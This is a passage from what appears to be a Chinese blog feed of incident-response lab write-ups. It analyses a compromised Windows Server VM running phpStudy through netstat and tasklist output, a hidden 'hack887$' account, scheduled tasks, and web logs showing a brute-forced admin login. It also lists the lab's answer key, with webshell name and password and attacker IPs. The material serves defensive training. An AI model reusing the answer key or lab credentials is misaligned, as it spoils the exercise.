class="line"></span><br><span class="line">协议  本地地址          外部地址        状态           PID</span><br><span class="line">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864</span><br><span class="line">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1016</span><br><span class="line">TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4</span><br><span class="line">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4</span><br><span class="line">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480</span><br><span class="line">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       652</span><br><span class="line">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1008</span><br><span class="line">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2172</span><br><span class="line">TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       616</span><br><span class="line">TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1912</span><br><span class="line">TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       636</span><br><span class="line">TCP    192.168.111.132:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">TCP    192.168.111.132:49962  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49963  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49964  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49965  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49966  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49967  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49968  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49969  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49970  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49971  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49972  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49973  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49974  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49975  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49976  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49977  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49978  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49979  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49980  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49981  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49982  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49983  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49984  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49985  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49986  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49987  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49988  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49989  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49990  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49991  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49992  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49993  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49994  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49995  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49996  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49997  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49998  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:49999  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50000  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50001  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50002  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50003  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50004  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50005  222.88.95.53:80        TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50007  20.247.184.197:443     TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50008  20.247.184.197:443     TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50010  152.195.38.76:80       ESTABLISHED     1008</span><br><span class="line">TCP    192.168.111.132:50011  23.13.191.96:80        ESTABLISHED     1456</span><br><span class="line">TCP    192.168.111.132:50012  222.134.66.229:80      ESTABLISHED     1456</span><br><span class="line">TCP    192.168.111.132:50015  104.65.230.44:80       TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50019  104.65.230.44:80       TIME_WAIT       0</span><br><span class="line">TCP    192.168.111.132:50024  104.65.230.44:80       SYN_SENT        1008</span><br><span class="line">TCP    [::]:135               [::]:0                 LISTENING       864</span><br><span class="line">TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">TCP    [::]:3389              [::]:0                 LISTENING       1016</span><br><span class="line">TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">TCP    [::]:5985              [::]:0                 LISTENING       4</span><br><span class="line">TCP    [::]:47001             [::]:0                 LISTENING       4</span><br><span class="line">TCP    [::]:49664             [::]:0                 LISTENING       480</span><br><span class="line">TCP    [::]:49665             [::]:0                 LISTENING       652</span><br><span class="line">TCP    [::]:49666             [::]:0                 LISTENING       1008</span><br><span class="line">TCP    [::]:49667             [::]:0                 LISTENING       2172</span><br><span class="line">TCP    [::]:49668             [::]:0                 LISTENING       616</span><br><span class="line">TCP    [::]:49669             [::]:0                 LISTENING       1912</span><br><span class="line">TCP    [::]:49671             [::]:0                 LISTENING       636</span><br><span class="line">UDP    0.0.0.0:123            *:*                                    2364</span><br><span class="line">UDP    0.0.0.0:500            *:*                                    1008</span><br><span class="line">UDP    0.0.0.0:3389           *:*                                    1016</span><br><span class="line">UDP    0.0.0.0:3702           *:*                                    4816</span><br><span class="line">UDP    0.0.0.0:3702           *:*                                    4816</span><br><span class="line">UDP    0.0.0.0:4500           *:*                                    1008</span><br><span class="line">UDP    0.0.0.0:5353           *:*                                    1456</span><br><span class="line">UDP    0.0.0.0:5355           *:*                                    1456</span><br><span class="line">UDP    0.0.0.0:49818          *:*                                    4816</span><br><span class="line">UDP    0.0.0.0:55522          *:*                                    1456</span><br><span class="line">UDP    127.0.0.1:53523        *:*                                    1008</span><br><span class="line">UDP    192.168.111.132:137    *:*                                    4</span><br><span class="line">UDP    192.168.111.132:138    *:*                                    4</span><br><span class="line">UDP    [::]:123               *:*                                    2364</span><br><span class="line">UDP    [::]:500               *:*                                    1008</span><br><span class="line">UDP    [::]:3389              *:*                                    1016</span><br><span class="line">UDP    [::]:3702              *:*                                    4816</span><br><span class="line">UDP    [::]:3702              *:*                                    4816</span><br><span class="line">UDP    [::]:4500              *:*                                    1008</span><br><span class="line">UDP    [::]:5353              *:*                                    1456</span><br><span class="line">UDP    [::]:5355              *:*                                    1456</span><br><span class="line">UDP    [::]:49819             *:*                                    4816</span><br><span class="line">UDP    [::]:55522             *:*                                    1456</span><br><span class="line">UDP    [fe80::d0fc:aeb7:36f1:db51%3]:546  *:*                                    652</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407141336952.png" data-fancybox="true"/></div></div><h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话<span class="comment">#       内存使用</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0          8 K</span><br><span class="line">System                           4 Services                   0        140 K</span><br><span class="line">Registry                        88 Services                   0     23,112 K</span><br><span class="line">smss.exe                       292 Services                   0      1,384 K</span><br><span class="line">csrss.exe                      376 Services                   0      5,448 K</span><br><span class="line">wininit.exe                    480 Services                   0      6,908 K</span><br><span class="line">csrss.exe                      488 Console                    1      5,636 K</span><br><span class="line">winlogon.exe                   548 Console                    1     17,548 K</span><br><span class="line">services.exe                   616 Services                   0      8,612 K</span><br><span class="line">lsass.exe                      636 Services                   0     16,996 K</span><br><span class="line">svchost.exe                    744 Services                   0     23,604 K</span><br><span class="line">fontdrvhost.exe                772 Console                    1     12,144 K</span><br><span class="line">fontdrvhost.exe                780 Services                   0      4,292 K</span><br><span class="line">svchost.exe                    864 Services                   0     12,892 K</span><br><span class="line">dwm.exe                        940 Console                    1     73,928 K</span><br><span class="line">svchost.exe                   1008 Services                   0     87,024 K</span><br><span class="line">svchost.exe                   1016 Services                   0     13,204 K</span><br><span class="line">svchost.exe                    284 Services                   0     22,912 K</span><br><span class="line">svchost.exe                    676 Services                   0     15,060 K</span><br><span class="line">svchost.exe                    652 Services                   0     45,116 K</span><br><span class="line">svchost.exe                   1144 Services                   0     33,088 K</span><br><span class="line">WUDFHost.exe                  1372 Services                   0      8,464 K</span><br><span class="line">svchost.exe                   1456 Services                   0     24,036 K</span><br><span class="line">svchost.exe                   1464 Services                   0      9,436 K</span><br><span class="line">svchost.exe                   1508 Services                   0      6,780 K</span><br><span class="line">svchost.exe                   1640 Services                   0     16,080 K</span><br><span class="line">svchost.exe                   1912 Services                   0      7,436 K</span><br><span class="line">spoolsv.exe                   2172 Services                   0     16,680 K</span><br><span class="line">svchost.exe                   2236 Services                   0     34,284 K</span><br><span class="line">phpStudyServer.exe            2256 Services                   0      9,608 K</span><br><span class="line">VGAuthService.exe             2276 Services                   0     11,640 K</span><br><span class="line">vmtoolsd.exe                  2312 Services                   0     23,212 K</span><br><span class="line">vm3dservice.exe               2324 Services                   0      7,220 K</span><br><span class="line">svchost.exe                   2364 Services                   0      7,892 K</span><br><span class="line">svchost.exe                   2372 Services                   0      8,640 K</span><br><span class="line">vm3dservice.exe               2488 Console                    1      7,884 K</span><br><span class="line">dllhost.exe                   2912 Services                   0     13,752 K</span><br><span class="line">msdtc.exe                      336 Services                   0     10,468 K</span><br><span class="line">WmiPrvSE.exe                  3232 Services                   0     20,868 K</span><br><span class="line">ChsIME.exe                    3752 Console                    1     14,928 K</span><br><span class="line">svchost.exe                   3792 Services                   0     14,324 K</span><br><span class="line">sihost.exe                    2340 Console                    1     24,512 K</span><br><span class="line">svchost.exe                   2348 Console                    1     31,800 K</span><br><span class="line">taskhostw.exe                 3884 Console                    1     12,944 K</span><br><span class="line">ctfmon.exe                    3696 Console                    1     16,616 K</span><br><span class="line">explorer.exe                  3880 Console                    1    126,116 K</span><br><span class="line">ChsIME.exe                     244 Console                    1     24,576 K</span><br><span class="line">MusNotifyIcon.exe             2788 Console                    1      9,804 K</span><br><span class="line">ShellExperienceHost.exe       4144 Console                    1     59,556 K</span><br><span class="line">SearchUI.exe                  4264 Console                    1     52,164 K</span><br><span class="line">RuntimeBroker.exe             4348 Console                    1     20,036 K</span><br><span class="line">RuntimeBroker.exe             4468 Console                    1     34,984 K</span><br><span class="line">svchost.exe                   4816 Services                   0     10,268 K</span><br><span class="line">smartscreen.exe               5068 Console                    1     24,328 K</span><br><span class="line">phpstudy_pro.exe              1368 Console                    1     62,208 K</span><br><span class="line">RuntimeBroker.exe             3808 Console                    1     13,172 K</span><br><span class="line">vmtoolsd.exe                  3080 Console                    1     40,308 K</span><br><span class="line">cmd.exe                       3848 Console                    1      4,272 K</span><br><span class="line">conhost.exe                   4660 Console                    1     43,860 K</span><br><span class="line">svchost.exe                   2524 Services                   0     12,220 K</span><br><span class="line">taskhostw.exe                  184 Console                    1     11,936 K</span><br><span class="line">svchost.exe                   4592 Services                   0     10,912 K</span><br><span class="line">TrustedInstaller.exe          4836 Services                   0      7,204 K</span><br><span class="line">TiWorker.exe                  3280 Services                   0     10,228 K</span><br><span class="line">WmiPrvSE.exe                  2652 Services                   0      8,512 K</span><br><span class="line">taskhostw.exe                 4172 Services                   0      7,280 K</span><br><span class="line">tasklist.exe                  1204 Console                    1      7,868 K</span><br></pre></td></tr></table></figure><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><p><code>win+r</code>:<code>lusrmgr.msc</code>发现一个影子账户:<code>hack887$</code>或<code>net localgroup administrators</code>只能查看通过<code>$</code>符号隐藏的账户</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416911.png" data-fancybox="true"/></div></div><p>查看该用户相关文件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416690.png" data-fancybox="true"/></div></div><p>在<code>Downloads</code>路径下发现<code>system.bat</code>.查看一下文件内容.发现了<code>WebShell</code>的创建和一个<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416059.png" data-fancybox="true"/></div></div><h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msconfig 启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br></pre></td></tr></table></figure><h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">taskschd.msc</span><br><span class="line">compmgmt.msc</span><br><span class="line">cmd--&gt;schtasks</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416745.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416936.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416852.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416131.png" data-fancybox="true"/></div></div><h2 id="Web应急响应"><a href="#Web应急响应" class="headerlink" title="Web应急响应"></a>Web应急响应</h2><p>开着PHPStudy那估计就会有web服务器,虽然背景中也说了,进入网站根目录,查找是否存在Webshell,或通过<code>%UserProfile%\Recent</code>查找最近修改的文件记录</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151416057.png" data-fancybox="true"/></div></div><p>通过日志上下文可以发现<code>404.php</code>并没有被上传上去而是直接访问的.结合上面的定时任务写马.大概可以确定不是后台漏洞进去的.继续分析日志</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417417.png" data-fancybox="true"/></div></div><p><code>/zb_system/cmd.php?act=verify</code>同样的<code>uri</code>有大量相同的请求并且响应体长度也都一样猜测是暴力破解并且成功.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417041.png" data-fancybox="true"/></div></div><p>查看源代码逻辑.如果密码正确则跳转到<code>admin/index.php?act=admin</code>,并且日志的上下文中也包含该路径.确定为暴力破解</p><mark class="tag-plugin colorful mark" color="red">由于数据库中的密码是进行过加密的.所以无法肉眼确定是否为弱密码</mark><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417681.png" data-fancybox="true"/></div></div><p>通过暴力破解或询问运维人员可得密码为:<code>admin123456</code>.也可通过<a href="https://bbs.zblogcn.com/thread-83419.html">官方的重置密码功能</a>进行重置.并且发现一个黑客用户</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417145.png" data-fancybox="true"/></div></div><p>在用户管理这里选择<code>Hacker</code>可发现最后一个<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417032.png" data-fancybox="true"/></div></div><p>通过分析数据库也可分析出<code>flag</code>.所以也不要遗忘数据库哦~</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417193.png" data-fancybox="true"/></div></div><p>通过日志可得<code>2024/3/12 11:53:58</code>创建用户.可与上方新建用户日志所对应</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417185.png" data-fancybox="true"/></div></div><h2 id="系统应急响应"><a href="#系统应急响应" class="headerlink" title="系统应急响应"></a>系统应急响应</h2><p>通过<code>eventvwr</code>查看用户创建日志,发现是直接通过administrator管理员用户创建的影子账户.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417423.png" data-fancybox="true"/></div></div><p>发现此用户通过RDP远程登陆了此机器</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151417697.png" data-fancybox="true"/></div></div><h2 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h2><p>由于是靶机.没有完整的攻击路径亦或是我技术不达标未恢复出真正的攻击路径</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407151415717.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="https://jiangjiyue.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Web2</title>
    <link href="https://jiangjiyue.github.io/2024/07/10/f05f6b8c/"/>
    <id>https://jiangjiyue.github.io/2024/07/10/f05f6b8c/</id>
    <published>2024-07-10T07:47:49.000Z</published>
    <updated>2024-07-25T16:32:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 12.80K</p>    </div>    <div class="cell" style="">    <p>代码: 10.39K, 文本: 0.93K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 49 分钟</p>    </div>    </div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。</p><p>这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><ol><li><p>攻击者的IP地址（两个）<psw>192.168.126.135 192.168.126.129</psw></p></li><li><p>攻击者的webshell文件名 <psw>system.php</psw></p></li><li><p>攻击者的webshell密码   <psw>hack6618</psw> </p></li><li><p>攻击者的伪QQ号？<psw>777888999321</psw></p></li><li><p>攻击者的伪服务器IP地址？<psw>256.256.66.88</psw></p></li><li><p>攻击者的服务器端口？<psw>65536</psw></p></li><li><p>攻击者是如何入侵的（选择题）</p></li><li><p>攻击者的隐藏用户名？ <psw>hack887$</psw></p></li></ol><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p><p>靶机环境：</p><ol><li><p>Windows Server 2022</p></li><li><p>phpstudy(小皮面板)</p></li></ol><p>相关账户密码:</p><ol><li><p>用户:administrator</p></li><li><p>密码:<a href="mailto:&#90;&#x67;&#x73;&#x66;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#90;&#x67;&#x73;&#x66;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1020</span><br><span class="line">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       672</span><br><span class="line">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516</span><br><span class="line">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1184</span><br><span class="line">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       696</span><br><span class="line">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1772</span><br><span class="line">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2368</span><br><span class="line">  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       652</span><br><span class="line">  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       2400</span><br><span class="line">  TCP    192.168.150.187:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.150.187:49674  23.207.173.206:80      TIME_WAIT       0</span><br><span class="line">  TCP    192.168.150.187:49680  23.207.172.81:443      ESTABLISHED     4972</span><br><span class="line">  TCP    192.168.150.187:49682  23.207.172.81:443      ESTABLISHED     4972</span><br><span class="line">  TCP    192.168.150.187:49683  23.207.172.81:443      ESTABLISHED     4972</span><br><span class="line">  TCP    192.168.150.187:49687  23.207.173.206:80      TIME_WAIT       0</span><br><span class="line">  TCP    192.168.150.187:49692  23.207.173.206:80      TIME_WAIT       0</span><br><span class="line">  TCP    192.168.150.187:49696  52.140.118.28:443      TIME_WAIT       0</span><br><span class="line">  TCP    192.168.150.187:49697  152.195.38.76:80       ESTABLISHED     2052</span><br><span class="line">  TCP    192.168.150.187:49698  52.165.165.26:443      ESTABLISHED     7068</span><br><span class="line">  TCP    192.168.150.187:49699  27.222.2.73:80         ESTABLISHED     7068</span><br><span class="line">  TCP    192.168.150.187:49708  51.11.168.232:443      ESTABLISHED     2452</span><br><span class="line">  TCP    192.168.150.187:49709  20.189.173.3:443       ESTABLISHED     2452</span><br><span class="line">  TCP    192.168.150.187:49710  27.222.2.73:80         ESTABLISHED     2452</span><br><span class="line">  TCP    192.168.150.187:49711  27.222.2.73:80         ESTABLISHED     2452</span><br><span class="line">  TCP    192.168.150.187:49722  52.165.165.26:443      ESTABLISHED     4136</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       892</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       1020</span><br><span class="line">  TCP    [::]:5985              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:47001             [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49664             [::]:0                 LISTENING       672</span><br><span class="line">  TCP    [::]:49665             [::]:0                 LISTENING       516</span><br><span class="line">  TCP    [::]:49666             [::]:0                 LISTENING       1184</span><br><span class="line">  TCP    [::]:49667             [::]:0                 LISTENING       696</span><br><span class="line">  TCP    [::]:49668             [::]:0                 LISTENING       1772</span><br><span class="line">  TCP    [::]:49669             [::]:0                 LISTENING       2368</span><br><span class="line">  TCP    [::]:49670             [::]:0                 LISTENING       652</span><br><span class="line">  TCP    [::]:49671             [::]:0                 LISTENING       2400</span><br><span class="line">  TCP    [::1]:49690            [::1]:5985             TIME_WAIT       0</span><br><span class="line">  TCP    [::1]:49691            [::1]:5985             TIME_WAIT       0</span><br><span class="line">  UDP    0.0.0.0:123            *:*                                    2756</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    2412</span><br><span class="line">  UDP    0.0.0.0:3389           *:*                                    1020</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    2412</span><br><span class="line">  UDP    0.0.0.0:5353           *:*                                    1784</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    1784</span><br><span class="line">  UDP    0.0.0.0:49647          *:*                                    1784</span><br><span class="line">  UDP    127.0.0.1:63670        127.0.0.1:63670                        2488</span><br><span class="line">  UDP    192.168.150.187:137    *:*                                    4</span><br><span class="line">  UDP    192.168.150.187:138    *:*                                    4</span><br><span class="line">  UDP    [::]:123               *:*                                    2756</span><br><span class="line">  UDP    [::]:500               *:*                                    2412</span><br><span class="line">  UDP    [::]:3389              *:*                                    1020</span><br><span class="line">  UDP    [::]:4500              *:*                                    2412</span><br><span class="line">  UDP    